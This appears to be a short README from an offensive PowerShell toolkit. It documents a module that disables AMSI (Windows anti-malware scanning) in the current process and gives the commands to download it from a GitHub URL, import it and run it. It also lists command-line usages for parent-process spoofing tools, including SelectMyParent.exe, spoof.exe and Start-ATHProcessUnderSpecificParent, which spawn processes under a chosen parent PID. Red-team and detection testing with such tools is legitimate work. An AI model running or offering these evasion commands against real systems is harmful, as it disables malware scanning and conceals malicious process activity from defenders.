## Module Name
   <b><i>AMSBP.ps1</i></b>

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|AMSBP|Disable AMSI within current process|User Land|\*\*\*|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.ps1" -OutFile "AMSBP.ps1"
```

```powershell
Import-Module -Name ".\AMSBP.ps1" -Force
AMSBP
```

---




[admin] .\SelectMyParent.exe <process-to-use> <pid-to-spoof>
[admin] .\SelectMyParent.exe notepad 32
spawn notepad.exe using id 32 (calculator)


[admin] spoof.exe pentestlab.exe 1116


[User Land]
#Spawns a notepad.exe process as a child of the current process.
Start-ATHProcessUnderSpecificParent -ParentId $PID -FilePath notepad.exe

#Spawns a notepad.exe process as a child of the first explorer.exe process.
Get-Process -Name explorer | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath notepad.exe

#Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.
Start-Process -FilePath $Env:windir\System32\notepad.exe -PassThru | Start-ATHProcessUnderSpecificParent -FilePath powershell.exe -CommandLine '-Command Write-Host foo'
